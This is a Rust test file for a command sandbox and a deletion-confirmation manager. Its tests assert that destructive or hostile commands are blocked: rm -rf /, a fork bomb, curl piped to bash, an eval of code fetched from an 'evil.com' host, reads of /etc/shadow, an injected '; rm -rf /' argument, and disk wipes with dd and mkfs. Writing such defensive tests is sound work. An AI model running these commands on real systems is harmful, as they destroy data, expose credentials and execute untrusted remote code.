// Integration tests for comprehensive enhancement plan features

#[cfg(test)]
mod tests {
    use infrastructure::sandbox::{Sandbox, ConfirmationManager};

    #[tokio::test]
    async fn test_sandbox_safety() {
        let sandbox = Sandbox::new();

        // Test blocked dangerous commands
        let result = sandbox.test_command("rm", &["-rf".to_string(), "/".to_string()]);
        assert!(result.is_err());

        // Test blocked system paths
        let result = sandbox.test_command("cat", &["/etc/passwd".to_string()]);
        assert!(result.is_err());

        // Test allowed safe commands
        let result = sandbox.test_command("ls", &["-la".to_string()]);
        assert!(result.is_ok());

        // Test programming commands
        let result = sandbox.test_command("cargo", &["check".to_string()]);
        assert!(result.is_ok());
    }

    #[tokio::test]
    async fn test_dangerous_pattern_detection() {
        let sandbox = Sandbox::new();

        // Test fork bomb pattern
        let result = sandbox.test_command("bash", &["-c".to_string(), ":(){ :|:& }; :".to_string()]);
        assert!(result.is_err());

        // Test pipe to shell
        let result = sandbox.test_command("curl", &["http://example.com".to_string(), "|".to_string(), "bash".to_string()]);
        assert!(result.is_err());

        // Test eval execution
        let result = sandbox.test_command("bash", &["-c".to_string(), "eval $(curl -s http://evil.com)".to_string()]);
        assert!(result.is_err());
    }

    #[tokio::test]
    async fn test_confirmation_manager() {
        let confirm = ConfirmationManager::new();

        // Test operations requiring confirmation
        assert!(confirm.requires_confirmation("delete", "/important/file.txt"));
        assert!(confirm.requires_confirmation("rm", "/etc/config"));
        assert!(confirm.requires_confirmation("drop", "database"));

        // Test operations not requiring confirmation
        assert!(!confirm.requires_confirmation("read", "/tmp/file.txt"));
        assert!(!confirm.requires_confirmation("list", "/home"));
    }

    #[tokio::test]
    async fn test_sandbox_execution_limits() {
        let mut sandbox = Sandbox::new();

        // Configure strict limits for testing
        sandbox.configure(std::time::Duration::from_millis(100), 1024);

        // Test timeout (this might fail in CI)
        let start = std::time::Instant::now();
        let result = sandbox.execute_safe("sleep", &["1".to_string()]).await;
        let elapsed = start.elapsed();

        // Should either timeout or complete quickly
        assert!(elapsed < std::time::Duration::from_secs(2));
    }

    #[tokio::test]
    async fn test_path_validation() {
        let sandbox = Sandbox::new();

        // Test allowed paths
        let result = sandbox.test_command("ls", &["/usr/bin".to_string()]);
        // This might be allowed depending on configuration

        // Test blocked system paths
        let result = sandbox.test_command("ls", &["/etc/shadow".to_string()]);
        assert!(result.is_err());

        // Test blocked device access
        let result = sandbox.test_command("dd", &["if=/dev/zero".to_string()]);
        assert!(result.is_err());
    }

    #[tokio::test]
    async fn test_command_whitelisting() {
        let mut sandbox = Sandbox::new();

        // Add custom allowed command
        sandbox.allow_command("custom_cmd".to_string());

        let result = sandbox.test_command("custom_cmd", &["arg1".to_string()]);
        assert!(result.is_ok());

        // Block a command
        sandbox.block_command("git".to_string());
        let result = sandbox.test_command("git", &["status".to_string()]);
        assert!(result.is_err());
    }

    #[tokio::test]
    async fn test_edge_cases() {
        let sandbox = Sandbox::new();

        // Test empty arguments
        let result = sandbox.test_command("ls", &[]);
        assert!(result.is_ok());

        // Test very long command
        let long_arg = "a".repeat(1000);
        let result = sandbox.test_command("echo", &[long_arg]);
        assert!(result.is_ok());

        // Test special characters in arguments
        let result = sandbox.test_command("ls", &["file; rm -rf /".to_string()]);
        assert!(result.is_err()); // Should be caught by pattern matching
    }

    #[tokio::test]
    async fn test_confirmation_validation() {
        let confirm = ConfirmationManager::new();

        // Test valid confirmation
        assert!(confirm.validate_confirmation("yes"));
        assert!(confirm.validate_confirmation("YES"));
        assert!(confirm.validate_confirmation("  yes  "));

        // Test invalid confirmation
        assert!(!confirm.validate_confirmation("no"));
        assert!(!confirm.validate_confirmation(""));
        assert!(!confirm.validate_confirmation("y"));
    }

    #[tokio::test]
    async fn test_sandbox_statistics() {
        let sandbox = Sandbox::new();
        let stats = sandbox.get_stats();

        assert!(stats.contains_key("allowed_commands"));
        assert!(stats.contains_key("blocked_commands"));
        assert!(stats.contains_key("max_execution_time_secs"));

        // Statistics should be reasonable
        assert!(stats["allowed_commands"].parse::<usize>().unwrap() > 0);
        assert!(stats["blocked_commands"].parse::<usize>().unwrap() > 0);
    }

    #[test]
    fn test_confirmation_prompt_generation() {
        let confirm = ConfirmationManager::new();

        let prompt = confirm.get_confirmation_prompt("delete", "/important/file.txt");
        assert!(prompt.contains("WARNING"));
        assert!(prompt.contains("delete"));
        assert!(prompt.contains("/important/file.txt"));
        assert!(prompt.contains("type 'yes' to confirm"));
    }

    #[tokio::test]
    async fn test_sandbox_configuration() {
        let mut sandbox = Sandbox::new();

        // Test configuration changes
        sandbox.configure(std::time::Duration::from_secs(60), 10 * 1024 * 1024);

        let stats = sandbox.get_stats();
        assert_eq!(stats["max_execution_time_secs"], "60");
        assert_eq!(stats["max_output_size_kb"], "10240");
    }

    #[tokio::test]
    async fn test_real_world_scenarios() {
        let sandbox = Sandbox::new();

        // Test common development commands
        assert!(sandbox.test_command("cargo", &["check".to_string()]).is_ok());
        assert!(sandbox.test_command("git", &["status".to_string()]).is_ok());
        assert!(sandbox.test_command("npm", &["install".to_string()]).is_ok());

        // Test system monitoring commands
        assert!(sandbox.test_command("ps", &["aux".to_string()]).is_ok());
        assert!(sandbox.test_command("df", &["-h".to_string()]).is_ok());

        // Test blocked dangerous operations
        assert!(sandbox.test_command("rm", &["-rf".to_string(), "/tmp/*".to_string()]).is_err());
        assert!(sandbox.test_command("dd", &["if=/dev/zero".to_string(), "of=/tmp/test".to_string()]).is_err());
    }

    #[tokio::test]
    async fn test_production_readiness() {
        let sandbox = Sandbox::new();
        let confirm = ConfirmationManager::new();

        // Test that all critical operations are protected
        let critical_commands = [
            ("rm", &["-rf".to_string(), "/".to_string()]),
            ("mkfs", &["ext4".to_string(), "/dev/sda".to_string()]),
            (">/dev/sda", &[]),
            ("dd", &["if=/dev/zero".to_string(), "of=/dev/mem".to_string()]),
        ];

        for (cmd, args) in &critical_commands {
            assert!(sandbox.test_command(cmd, args).is_err(), "Command {} should be blocked", cmd);
        }

        // Test that destructive operations require confirmation
        assert!(confirm.requires_confirmation("delete", "/important/database.db"));
        assert!(confirm.requires_confirmation("drop", "production_table"));
        assert!(confirm.requires_confirmation("format", "/dev/sda1"));
    }
}